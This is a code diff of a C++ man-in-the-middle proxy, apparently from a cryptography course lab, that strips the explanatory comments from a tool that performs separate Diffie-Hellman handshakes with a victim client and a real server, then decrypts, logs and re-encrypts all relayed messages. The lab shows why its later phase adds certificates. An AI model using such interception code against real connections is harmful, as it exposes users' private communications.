@@ -1,17 +1,3 @@
-// Phase 2 - Man-in-the-Middle Attack (spec 3.3)
-//
-// Run on the Mallory VM. The victim client is manually pointed at
-// Mallory's IP:port instead of the real server's -- Mallory then performs
-// TWO INDEPENDENT DH handshakes: one with the victim (posing as the
-// server), one with the real server (posing as the client). Neither the
-// victim nor the real server can tell anything is wrong: the victim's
-// fingerprint check genuinely matches what "the server" (actually Mallory)
-// computed, because Mallory really did complete a legitimate DH exchange
-// with the victim. There is no cryptographic anomaly to detect from inside
-// the Phase 2 protocol -- that's exactly the gap Phase 3's certificates
-// close.
-//
-// Usage: ./mallory_proxy <listen_port> <real_server_ip> <real_server_port>
 #include <arpa/inet.h>
 #include <netinet/in.h>
 #include <sys/socket.h>
@@ -38,11 +24,6 @@ static void log(const std::string &msg) {
     std::cout << "[" << timestamp() << "] " << msg << std::endl;
 }
 
-// Reads encrypted lines from `from_reader` (decrypting with `from_key`),
-// logs the captured plaintext, then re-encrypts under `to_key` and forwards
-// to `to_fd`. This is the core of the attack: Mallory has full read/write
-// access to plaintext content passing through it, despite neither endpoint
-// having a direct connection to the other.
 static void relay_direction(LineReader *from_reader, const std::vector<uint8_t> &from_key,
                              int to_fd, const std::vector<uint8_t> &to_key,
                              channel::Direction to_dir, const std::string &label) {
@@ -103,7 +84,6 @@ int main(int argc, char *argv[]) {
         inet_ntop(AF_INET, &victim_addr.sin_addr, ip, sizeof(ip));
         log("Victim connected from " + std::string(ip));
 
-        // --- Leg 1: pose as the SERVER towards the victim ---
         LineReader victim_reader{victim_fd, ""};
         handshake::Result hs_victim;
         try {
@@ -115,7 +95,6 @@ int main(int argc, char *argv[]) {
             continue;
         }
 
-        // --- Leg 2: pose as the CLIENT towards the real server ---
         int server_fd = socket(AF_INET, SOCK_STREAM, 0);
         sockaddr_in server_addr{};
         server_addr.sin_family = AF_INET;
@@ -147,10 +126,7 @@ int main(int argc, char *argv[]) {
         log("Both endpoints now believe they have a direct, secure connection to "
             "each other. Neither does.");
 
-        // Relay bidirectionally, decrypting/logging/re-encrypting every
-        // message crossing in either direction -- including the victim's
-        // username registration line, since it's just another encrypted
-        // line as far as this relay logic is concerned.
+            
         std::thread t1(relay_direction, &victim_reader, hs_victim.key, server_fd,
                         hs_server.key, channel::CLIENT_TO_SERVER, "victim->server");
         std::thread t2(relay_direction, &server_reader, hs_server.key, victim_fd,
